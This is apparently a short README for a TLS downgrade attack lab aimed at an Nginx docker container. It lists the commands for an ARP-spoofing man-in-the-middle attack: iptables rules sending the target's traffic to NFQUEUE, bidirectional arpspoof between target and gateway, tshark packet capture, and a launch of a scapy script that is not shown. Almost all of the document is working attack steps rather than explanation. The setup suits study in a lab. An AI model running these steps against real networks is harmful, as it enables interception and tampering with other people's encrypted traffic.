# TLS Downgrade Attack

Obtain IP Nginx webserver docker container

```console
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nginx-server
```

Install apt packages

```console
apt install tshark 
```

Install pip packages

```console
pip3 install -r req.txt
```

Add iptables rules => /etc/iptables/rules.v4

```console
-A FORWARD -s $TARGET_IP/32 -j NFQUEUE --queue-num 2
-A POSTROUTING -s $TARGET_IP/32 -j MASQUERADE
```

Launch arpspoof sessions

```console
arpspoof -i $IFACE -t $TARGET_IP $GATEWAY_IP
arpspoof -i $IFACE -t $GATEWAY_IP $TARGET_IP 
```

Capture packets

```console
tshark -i $IFACE -w capture.pcapng -f "host $TARGET_IP"
```

Read captured packets

```console
tshark -r capture.pcapng
```

Run application

```console
python3 scapyTLS.py
```

Use sudo privileges if required!
